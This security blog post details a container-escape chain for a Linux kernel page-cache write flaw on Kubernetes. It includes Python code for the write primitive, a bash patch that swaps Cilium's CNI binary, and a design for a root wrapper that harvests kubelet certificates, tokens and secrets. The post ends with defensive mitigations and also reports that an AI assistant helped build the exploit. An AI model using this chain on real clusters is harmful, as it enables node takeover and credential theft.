---
title: "Copy Fail: From Unprivileged Pod to Kubernetes Node Root"
date: 2026-05-01T10:00:00+02:00
slug: copyfail-cve-2026-31431-kubernetes-escape
cover:
  image: /images/2026/05-copyfail/cover.png
tags: [kubernetes, security, cve, linux, talos, cilium, container-escape]
---

> **Work in progress.** This article is incomplete. Some exploit details are
> intentionally omitted.

## Context

I work at [PostFinance](https://www.postfinance.ch), where we run a
Kubernetes platform supporting banking workloads. Our production clusters run
Debian 12 with kernel 6.1.158+, which happens to be **not vulnerable** to
CVE-2026-31431 (more on that at the end).

When the CVE [dropped publicly](https://copy.fail) on April 29, I set out to
answer a question: **what does it take to go from an unprivileged pod to full
node root on a vulnerable Kubernetes cluster?**

The entire exploit development — from understanding the primitive to writing
the C wrapper and staging the attack chain — was done with heavy use of
[OpenCode](https://github.com/anomalyco/opencode)/Claude Code with Claude as
a pair-programming partner. This article was also co-written that way.

Lab target: Talos Linux v1.12.4, kernel 6.18.9, Cilium v1.18.6 as CNI.

## The Vulnerability in 30 Seconds

[CVE-2026-31431](https://copy.fail) ("Copy Fail") is a logic flaw in the
Linux kernel's `AF_ALG` socket interface combined with `authencesn` (the AEAD
template for IPsec extended sequence numbers).

The result: **write 4 arbitrary bytes into the page cache of any readable
file**, without write permissions, without race conditions, in under 1 second.
The page cache change is invisible to on-disk checksums.

The core primitive in Python:

```python
def write_4bytes(fd, offset, data):
    assert len(data) == 4
    conn, h = make_conn()  # AF_ALG + authencesn(hmac(sha256),cbc(aes))
    count = offset + 4
    conn.sendmsg(
        [b"A" * 4 + data],
        [(h, 3, b'\x00' * 4), (h, 2, b'\x10' + b'\x00' * 19), (h, 4, b'\x08' + b'\x00' * 3)],
        32768,
    )
    r, w = os.pipe()
    os.splice(fd, w, count, offset_src=0)  # page cache pages enter pipe
    os.splice(r, conn.fileno(), count)      # pipe → AF_ALG TX SGL
    try:
        conn.recv(8 + offset)  # triggers authencesn decrypt → OOB write
    except Exception:
        pass
    os.close(r); os.close(w); conn.close()
```

Full technical details at the
[Xint writeup](https://xint.io/blog/copy-fail-linux-distributions).

## Key Insight: Page Cache is Shared Across Containers

The Linux page cache is **not namespaced**. All containers using the same OCI
image layer share the same overlayfs lower-layer inodes — and therefore the
same kernel page cache entries.

This means: an unprivileged pod based on the Cilium image can corrupt any
readable file in that image, and the Cilium DaemonSet pod on the same node
will see the corrupted content when it next reads that file.

No write permission needed. No privilege required. Just `open(path, O_RDONLY)`
and the write primitive.

## Choosing a Target

The exploit needs a privileged DaemonSet whose container image we can reuse as
a base layer. We chose **Cilium** — not because it's uniquely flawed, but
because it runs on a huge number of clusters and its init containers execute
scripts with host-level volume mounts. Any DaemonSet with similar properties
would work.

**Cilium is not to blame here.** It's a well-designed CNI that happens to have
the properties we need: a shared base image, an init container that runs
scripts from the image, and host-writable volumes. The real bug is in the
kernel.

Finding the target image is easy: `node.status.images[]` in the Kubernetes API
lists every image pulled on a node. Match that against DaemonSet pod specs to
identify shared layers.

## Building the Attack Pod

We build a container image `FROM` the exact same Cilium image. On top, we add
a Python interpreter from
[`python-build-standalone`](https://github.com/astral-sh/python-build-standalone)
(a fully static, relocatable CPython build) plus our exploit script and the
pre-compiled wrapper binary. That's our attack pod — it shares overlayfs layers
with Cilium but has a Python runtime to drive the exploit.

## The Attack Chain

1. **Deploy the attack pod** on the same node as the Cilium DaemonSet. Because
   it uses the same base image, containerd's snapshotter shares the lower
   overlayfs layers — and therefore the same page cache pages.

2. **Stage a static ELF wrapper** (25KB, musl-linked) into the page cache of
   `/opt/cni/bin/cilium-cni`. The file is 68MB; we overwrite only the first
   25KB. The rest doesn't matter — we'll use `dd` with a byte count to extract
   just the wrapper later.

3. **Patch `install-plugin.sh`** — a bash script run by Cilium's init
   container. We overwrite a 219-byte function body (offsets 308-526) with:

   ```bash
   d="${CNI_DIR}/bin/$(basename $1)"
   [ -s "$d.real" ]&&[ $(wc -c<"$d.real") -gt 99999 ]||mv "$d" "$d.real" 2>&-
   dd if=$1 of=$d bs=1 count=25720 2>&-
   chmod +x "$d"
   }
   ```

   This renames the real CNI binary to `.real`, extracts our wrapper from the
   image file via `dd`, and makes it executable.

4. **Trigger Cilium pod restart** so init containers re-run.
   [Open problem — see below.]

5. **Init container executes the modified script** — our wrapper binary lands
   on the host at `/opt/cni/bin/cilium-cni`.

6. **Kubelet calls the wrapper as root** on the next pod lifecycle event
   (any pod creation/deletion on the node triggers a CNI call). More on
   how the wrapper works below.

7. **Collect the loot.** The wrapper extracts everything it can reach —
   all pod secrets and SA tokens, the kubelet client certificate, and even
   the Talos STATE partition contents (cluster CA key, etcd CA key, machine
   config). It exfiltrates by simply writing files into
   `/var/lib/kubelet/pods/<uid>/volumes/kubernetes.io~empty-dir/exfil-sandbox`
   — our attack pod's emptyDir volume, located by scanning pod directories
   for the volume name. Back in the attack pod, the results appear at
   `/sandbox/`.

## The CNI Wrapper Binary

This technique is the same idea I described in my
[2021 article on CNI deconstructed](/kubernetes-cni-deconstructed): kubelet
calls the CNI binary as root for every pod lifecycle event (`ADD`, `DEL`,
`CHECK`), passing network configuration on stdin and environment variables.
We slip our own binary in place of the real one.

The wrapper is a 25KB static C binary (musl-linked, stripped). When kubelet
invokes it:

1. **Locate the exfiltration sandbox** — scans
   `/var/lib/kubelet/pods/*/volumes/kubernetes.io~empty-dir/exfil-sandbox`
   to find our attack pod's emptyDir volume.

2. **Harvest credentials:**
   - Kubelet client certificates from `/var/lib/kubelet/pki/`
   - ServiceAccount tokens from every pod's projected volume
   - All mounted secrets (`kubernetes.io~secret` volumes) from every pod

3. **Execute a staged command** — if a `cmd` binary exists in the sandbox,
   fork+exec it and capture output. This gives us arbitrary code execution as
   host root, triggered remotely by dropping a binary into the emptyDir.

4. **`execv()` the real CNI binary** (`argv[0] + ".real"`) — the original
   `cilium-cni` runs transparently. Kubelet sees a normal CNI response.
   Nothing breaks, nothing logs an error.

The key insight: kubelet doesn't verify the CNI binary's integrity. Whatever
sits at `/opt/cni/bin/cilium-cni` gets executed as root, with full host
filesystem access, on every single pod event on that node.

## Why Talos Made This Harder

Talos Linux is designed to be minimal and immutable. This made the exploit
chain significantly more difficult:

- **No shell on the host.** `/bin/sh`, `/bin/bash` — none of them exist.
  Shell script wrappers fail with `fork/exec: no such file or directory`. Our
  CNI wrapper had to be a fully static ELF binary.

- **No package manager in the Cilium image.** The Wolfi-based Cilium image
  has no `apk`. We had to bundle a static Python via
  `python-build-standalone` to get an interpreter at all.

- **Static binary size matters.** A Go binary compiled to 1.2MB — too large
  for the write primitive. Plain C with musl: 25KB. That's 6,430 `write4`
  calls — under 1 second.

## Open Problem: Triggering the Restart

The exploit requires Cilium's init containers to re-run after the page cache
is corrupted. This means the Cilium pod needs to restart.

Ideas explored:
- **Patch `iptables-wrapper`** — initially promising, but it turns out this
  script is only called once during startup, not continuously. Dead end.
- **Corrupt `cilium-agent` itself** — use the write primitive to flip a few
  bytes in a hot section of the Go binary, causing a crash. Then immediately
  fix the bytes back so the restart succeeds cleanly. Still a WIP — requires
  finding a reliably-hit code path and a corruption that triggers a crash
  rather than silent misbehavior.
- **Wait for natural restart** — Cilium upgrades, node maintenance, OOM kills.
  Viable but not deterministic.
- **Direct pod deletion** — requires API access the attack pod doesn't have.

This is the one step not yet cleanly solved in a fully unprivileged,
self-contained exploit. The page cache writes are permanent (until eviction),
so the attacker can stage everything and wait.

## Why PostFinance Is Not Affected

Our production clusters run Debian 12 with kernel `6.1.158-1` and above.

These kernels contain a [backport](https://github.com/gregkh/linux/commit/2b8bbc64b5c2)
of the `af_alg_sendpage()` → `MSG_SPLICE_PAGES` conversion. Due to an
unresolved TODO in the backport, data is **always copied** into fresh kernel
pages rather than passing page cache references zero-copy. The OOB write still
happens, but it lands on copied pages — harmlessly.

This is an accidental mitigation, not the official fix. Kernels >= 6.5
(mainline) properly implement the zero-copy path and are vulnerable again
until the [official patch](https://github.com/torvalds/linux/commit/a664bf3d603d).

Reference: [theori-io/copy-fail-CVE-2026-31431#19](https://github.com/theori-io/copy-fail-CVE-2026-31431/issues/19)

## Mitigation for Affected Clusters

**Patch the kernel.** The fix is mainline commit `a664bf3d603d`. Most distros
are shipping it now.

**Immediate (no reboot):** deploy
[`cozystack/copy-fail-blocker`](https://github.com/cozystack/copy-fail-blocker)
— a BPF-LSM DaemonSet that blocks all `AF_ALG` socket creation cluster-wide:

```bash
kubectl apply -f https://raw.githubusercontent.com/cozystack/copy-fail-blocker/v0.2.1/manifests/copy-fail-blocker.yaml
```

Verify it works from any pod:

```python
import socket
try:
    socket.socket(38, socket.SOCK_SEQPACKET, 0)  # AF_ALG = 38
    print("FAIL: AF_ALG socket created")
except OSError as e:
    print("OK:", e)
# Expected: OK: [Errno 1] Operation not permitted
```

**Note:** RuntimeDefault seccomp does NOT block `AF_ALG`. Pod Security
Standards (even Restricted) do not block the socket path either. You need
either the BPF-LSM blocker, a custom seccomp profile, or the kernel patch.

## Takeaways

- **CNI plugins are a high-value target.** They run as host root with access
  to all kubelet credentials. A single corrupted init script becomes persistent
  host-level code execution.

- **BPF-LSM is the fastest no-reboot mitigation** for kernel-level attack
  surface. `copy-fail-blocker` deploys in seconds and covers every pod on the
  node, regardless of seccomp or PSS configuration.

- **Even "unprivileged" pods can achieve node compromise** if they share an
  image layer with a privileged workload. Consider whether your CNI, CSI, or
  monitoring DaemonSets share base images with tenant workloads..
